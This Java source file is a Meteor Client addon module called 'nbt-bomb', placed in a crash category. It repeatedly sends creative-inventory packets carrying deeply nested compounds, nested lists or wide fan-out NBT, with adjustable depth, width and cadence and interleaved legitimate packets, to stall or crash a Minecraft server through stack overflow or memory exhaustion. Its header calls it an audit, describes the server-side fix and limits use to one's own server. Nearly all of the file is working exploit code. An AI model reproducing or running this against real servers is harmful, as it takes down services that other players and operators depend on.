package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

/**
 * AUDIT: NBT Bomb (parser recursion / fan-out / OOM)
 *
 * Sends CreativeInventoryActionC2SPacket with a CUSTOM_DATA component carrying a
 * pathological NbtCompound. Three shapes, because a server can cap one and miss
 * the others (depth over volume — review criterion 1):
 *
 *   LINEAR — {n:{n:{n:…}}} × depth. Tests the compound recursion-depth cap; a
 *     missing cap overflows the stack at ~500–2000 levels.
 *   LIST   — nested NbtList ([[[…]]]). The list decode path is SEPARATE from the
 *     compound path and frequently has a different (or absent) depth cap.
 *   WIDE   — a root compound holding `width` sibling keys, each nested `depth`
 *     deep: width×depth allocations from a compact packet, exercising the
 *     allocate-before-reject window even when a stack cap exists.
 *
 * Requires creative mode. A server that doesn't bound NBT depth AND fan-out at
 * decode time will stall or OOM under sustained fire.
 *
 * Vulnerable server: recurses / allocates the whole tree before any cap fires.
 * Hardened server: counts nesting + element budget at the byte-stream level and
 * rejects with a graceful disconnect before allocating Java objects.
 * Fix: cap compound depth, list depth, and total element count at decode (Paper
 * caps depth at 512); reject over-limit payloads, never throw on them.
 *
 * Requires creative mode. Run against your OWN local server only.
 */
public class NbtBomb extends Module {
    public enum Shape { LINEAR, LIST, WIDE }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Shape> shape = sgGeneral.add(new EnumSetting.Builder<Shape>()
        .name("shape")
        .description("LINEAR = nested compounds; LIST = nested lists (separate parser path); WIDE = many siblings × depth (fan-out).")
        .defaultValue(Shape.LINEAR).build()
    );
    private final Setting<Integer> depth = sgGeneral.add(new IntSetting.Builder()
        .name("depth").description("Nesting levels.")
        .defaultValue(512).range(1, 4096).sliderRange(1, 1024).build()
    );
    private final Setting<Integer> width = sgGeneral.add(new IntSetting.Builder()
        .name("width").description("Sibling keys per level (WIDE shape). Total nodes ≈ width × depth.")
        .defaultValue(64).range(1, 4096).sliderRange(1, 512)
        .visible(() -> shape.get() == Shape.WIDE).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public NbtBomb() {
        super(AddonTemplate.CRASH_CATEGORY, "nbt-bomb",
            "Sends pathological NBT (deep compound / deep list / wide fan-out) via creative slot packet. Requires creative mode.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        ticksActive++;
        gr.tick();
        if (mc.player == null || !mc.player.getAbilities().creativeMode) return;
        if (!cadence.shouldFire()) return;

        NbtCompound root = switch (shape.get()) {
            case LINEAR -> buildLinear(depth.get());
            case LIST -> buildList(depth.get());
            case WIDE -> buildWide(depth.get(), width.get());
        };
        ItemStack stack = new ItemStack(Items.STONE);
        stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(root));
        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, stack));
        packetsSent++;
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    private static NbtCompound buildLinear(int levels) {
        NbtCompound current = new NbtCompound();
        for (int i = 0; i < levels; i++) {
            NbtCompound parent = new NbtCompound();
            parent.put("n", current);
            current = parent;
        }
        return current;
    }

    private static NbtCompound buildList(int levels) {
        NbtList current = new NbtList();
        for (int i = 0; i < levels; i++) {
            NbtList parent = new NbtList();
            parent.add(current);
            current = parent;
        }
        NbtCompound root = new NbtCompound();
        root.put("n", current);
        return root;
    }

    private static NbtCompound buildWide(int levels, int width) {
        NbtCompound root = new NbtCompound();
        for (int w = 0; w < width; w++) root.put("k" + w, buildLinear(levels));
        return root;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
